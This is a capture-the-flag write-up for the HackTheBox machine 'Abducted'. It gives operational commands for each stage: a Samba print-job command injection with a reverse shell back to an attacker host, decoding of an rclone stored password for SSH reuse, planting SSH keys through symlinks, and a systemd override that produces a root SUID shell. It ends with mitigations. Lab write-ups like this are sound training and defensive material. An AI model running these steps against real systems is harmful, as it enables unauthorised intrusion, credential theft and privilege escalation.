# HTB-Abducted-writeup
HTB-Abducted-writeup
# HackTheBox — Abducted (Medium)

## Overview

| Field | Value |
|-------|-------|
| Machine | Abducted |
| IP | 10.129.21.3 |
| OS | Ubuntu Linux |
| Difficulty | Medium |
| Release | 06 May 2026 |
| Tags | Samba, CVE-2026-4480, Print Subsystem RCE, rclone, systemd override, symlink privesc |

**Exploit chain:** `SMB recon → CVE-2026-4480 (%J injection) → RCE as nobody → rclone config → SSH as scott → symlink + SMB force user → marcus → systemd override → root`

---

## 1. Reconnaissance

### 1.1 Port Scan

![nmap-scan]

```
nmap -sT -p- --min-rate 5000 -oN full_tcp.txt 10.129.21.3
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu-3ubuntu13.16
139/tcp open  netbios-ssn Samba smbd 4.x (workgroup: HARTLEY)
445/tcp open  netbios-ssn Samba smbd 4.x (workgroup: HARTLEY)
```

### 1.2 SMB Enumeration

![smb-shares]

```
smbclient -N -L //10.129.21.3
```

| Sharename | Type | Comment | Access |
|-----------|------|---------|--------|
| HP-Reception | Printer | Reception printer | Guest write |
| projects | Disk | Hartley Group Project Files | Auth required |
| transfer | Disk | Staff file transfer | Auth required |
| IPC$ | IPC | IPC Service | Anonymous |

### 1.3 User Enumeration

![rid-cycling]

```
rpcclient -N -U "" 10.129.21.3 -c "enumdomusers"
rpcclient -N -U "" 10.129.21.3 -c "queryuser 0x3e8"
rpcclient -N -U "" 10.129.21.3 -c "lookupsids S-1-22-1-1001"
```

| User | Source | RID |
|------|--------|-----|
| scott (Scott Mercer) | Samba pdb | 0x3e8 |
| marcus | Unix (S-1-22-1-1001) | — |

---

## 2. Vulnerability Identification — CVE-2026-4480

The guest-writable printer share (`HP-Reception`) combined with the May 2026 release date points to **CVE-2026-4480**, a pre-auth command injection in Samba's print subsystem.

- **Root cause:** `%J` (job description) passed into `system()` via `print command` with only `' → _` escaping
- **Condition:** `printing = sysv` (non-CUPS) + `print command` references `%J` + guest print access
- **CVSS:** 10.0 (Critical)
- **Fixed in:** Samba 4.22.10, 4.23.8, 4.24.3

![cve-details]

From `shares.conf`:

```
[HP-Reception]
   print command = /usr/local/bin/printaudit %J %s
```

The `%J` is unquoted and passes through to the shell — direct injection sink.

---

## 3. Exploitation — Initial Foothold

### 3.1 Exploit Setup

Install prerequisite and use the PoC from `TheCyberGeek/CVE-2026-4480-PoC`:

```
sudo apt install python3-samba
```

![exploit-code]

**Key exploit logic:**
1. Connect via `ncacn_np:\pipe\spoolss` (anonymous)
2. `OpenPrinter` on `\\10.129.21.3\HP-Reception`
3. `document_name = "|sh"` ← this becomes `%J`
4. Body = reverse shell payload ← this becomes spool file
5. `EndDocPrinter` triggers `print command` → `system()` executes with `%J = |sh`
6. Shell injection: `|sh` creates a pipe, executing the spool file body

### 3.2 Reverse Shell

![reverse-shell]

**Terminal 1 — Listener:**
```
nc -lvnp 4444
```

**Terminal 2 — Exploit:**
```
python3 cve-2026-4480.py 10.129.21.3 10.10.17.165 4444
```

**Result:**
```
listening on [any] 4444 ...
connect to [10.10.17.165] from (UNKNOWN) [10.129.21.3] 57890
bash: cannot set terminal process group (3626): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$
```

We land as `nobody` in `/var/spool/samba/`.

---

## 4. Post-Exploitation — From nobody to scott

### 4.1 System Enumeration

```
nobody@abducted:/var/spool/samba$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

nobody@abducted:/var/spool/samba$ cat /etc/passwd | grep -E "sh$"
root:x:0:0:root:/root:/bin/bash
scott:x:1000:1000:Scott Mercer:/home/scott:/bin/bash
marcus:x:1001:1001:,,,:/home/marcus:/bin/bash
```

### 4.2 Rclone Config Discovery

![rclone-config]

```
find / -name "rclone*" -type f 2>/dev/null
```

Key finding: `/opt/offsite-backup/rclone.conf`

```
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

### 4.3 Decoding the Password

```
/usr/bin/rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

Output: `iXzvcib3SrpZ`

### 4.4 SSH as scott

![ssh-scott]

This password works for scott's SSH account:

```
sshpass -p 'iXzvcib3SrpZ' ssh scott@10.129.21.3
```

```
uid=1000(scott) gid=1001(scott) groups=1001(scott)
```

---



## 5. Privilege Escalation: scott → marcus

### 5.1 Key Discovery

From `shares.conf`:

```
[transfer]
   valid users = scott
   force user = marcus
   wide links = yes
   path = /srv/transfer
```

Two critical settings:
- **`force user = marcus`** — files created via SMB are owned by marcus
- **`wide links = yes`** — symlinks pointing outside the share are followed

### 5.2 Creating Marcus's SSH Directory

![symlink-mkdir]

Create a symlink from the transfer share to marcus's home, then use SMB `mkdir` to create `.ssh`:

```
scott@abducted:~$ ln -s /home/marcus/ /srv/transfer/mhome
```

```
smbclient -U "scott%iXzvcib3SrpZ" //10.129.21.3/transfer -c 'mkdir mhome/.ssh'
```

The `force user = marcus` makes the directory owned by marcus.

### 5.3 Writing authorized_keys

Create a symlink to the `.ssh` directory and write our SSH public key:

```
scott@abducted:~$ ln -s /home/marcus/.ssh/ /srv/transfer/dot_ssh
```

```
cat /tmp/abducted_key.pub | \
  smbclient -U "scott%iXzvcib3SrpZ" //10.129.21.3/transfer \
    -c 'put - dot_ssh/authorized_keys'
```

![smb-put]

### 5.4 SSH as marcus

![ssh-marcus]

```
ssh -i abducted_key marcus@10.129.21.3
```

```
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

Marcus is in the **`operators`** group (GID 1000).

---

## 6. Privilege Escalation: marcus → root

### 6.1 The operators Group

The `smbd.service.d/` directory is group-writable by `operators`:

```
drwxrws---  2 root operators 4096 smbd.service.d
```

Marcus also has polkit privileges to reload systemd and restart services.

### 6.2 Systemd Override

![systemd-override]

Create a drop-in override that runs as root on smbd restart:

```
cat > /etc/systemd/system/smbd.service.d/override.conf << 'EOF'
[Service]
ExecStartPost=/bin/bash -c "cp /bin/bash /tmp/shell && chmod +s /tmp/shell"
EOF
```

### 6.3 Trigger the Override

```
systemctl daemon-reload
systemctl restart smbd.service
```

The override runs `ExecStartPost` as root, creating a SUID bash at `/tmp/shell`.

![suid-shell]

```
-rwsr-sr-x 1 root root 1446024 Jun  8 12:21 /tmp/shell
```

### 6.4 Root Shell

![root-flag]

```
/tmp/shell -p -c "id; cat /root/root.txt"
```

```
uid=1001(marcus) gid=1002(marcus) euid=0(root) egid=0(root) groups=0(root),1000(operators),1002(marcus)
```

---

## 7. Full Exploit Chain Diagram

```
┌─────────────┐     ┌──────────────────┐     ┌──────────────────┐
│   Attacker   │────▶│  CVE-2026-4480   │────▶│  RCE (nobody)    │
│ 10.10.17.165 │     │  %J injection    │     │  /var/spool/samba│
└─────────────┘     └──────────────────┘     └────────┬─────────┘
                                                       │
                                                       ▼
                                              ┌──────────────────┐
                                              │  rclone config    │
                                              │  → password found │
                                              │  → SSH as scott   │
                                              └────────┬─────────┘
                                                       │
                                                       ▼
                                              ┌──────────────────────────┐
                                              │  force user = marcus     │
                                              │  + wide links = yes      │
                                              │  → write authorized_keys │
                                              │  → SSH as marcus         │
                                              └────────┬─────────────────┘
                                                       │
                                                       ▼
                                              ┌──────────────────────────┐
                                              │  operators group         │
                                              │  → systemd override      │
                                              │  → ExecStartPost as root │
                                              │  → SUID shell → root     │
                                              └──────────────────────────┘
```

---

## 8. Key Commands Quick Reference

```bash
# Step 1: CVE-2026-4480 exploit
sudo apt install python3-samba
nc -lvnp 4444
python3 cve-2026-4480.py 10.129.21.3 10.10.17.165 4444

# Step 2: Decode rclone password
/usr/bin/rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw

# Step 3: SSH as scott
sshpass -p 'iXzvcib3SrpZ' ssh scott@10.129.21.3

# Step 4: Create marcus SSH access via SMB force user
ln -s /home/marcus/ /srv/transfer/mhome
smbclient -U "scott%iXzvcib3SrpZ" //10.129.21.3/transfer \
  -c 'mkdir mhome/.ssh'
ln -s /home/marcus/.ssh/ /srv/transfer/dot_ssh
cat ~/.ssh/id_rsa.pub | \
  smbclient -U "scott%iXzvcib3SrpZ" //10.129.21.3/transfer \
    -c 'put - dot_ssh/authorized_keys'

# Step 5: SSH as marcus
ssh -i id_rsa marcus@10.129.21.3

# Step 6: Systemd override → root
cat > /etc/systemd/system/smbd.service.d/override.conf << 'EOF'
[Service]
ExecStartPost=/bin/bash -c "cp /bin/bash /tmp/sh && chmod +s /tmp/sh"
EOF
systemctl daemon-reload
systemctl restart smbd.service
/tmp/sh -p -c "cat /root/root.txt"
```

---

## 9. CVSS & CVE Details

| Field | Value |
|-------|-------|
| **CVE** | CVE-2026-4480 |
| **CVSS v3.1** | 10.0 (Critical) |
| **CWE** | CWE-78 — OS Command Injection |
| **Published** | 2026-05-26 |
| **Patched in** | Samba 4.22.10, 4.23.8, 4.24.3 |

---

## 10. Mitigation

1. **Patch Samba** to ≥4.22.10, 4.23.8, or 4.24.3
2. **Remove `%J`** from `print command` or quote it: `'%J'`
3. **Switch to CUPS** (`printing = cups`) — not affected
4. **Disable guest printer access** — require authentication
5. **Remove `wide links = yes`** — prevents symlink-based file writes
6. **Remove `force user`** on SMB shares — prevents user impersonation
7. **Restrict `operators` group membership** — only trusted admins
8. **Restrict polkit permissions** — prevent non-root systemd control
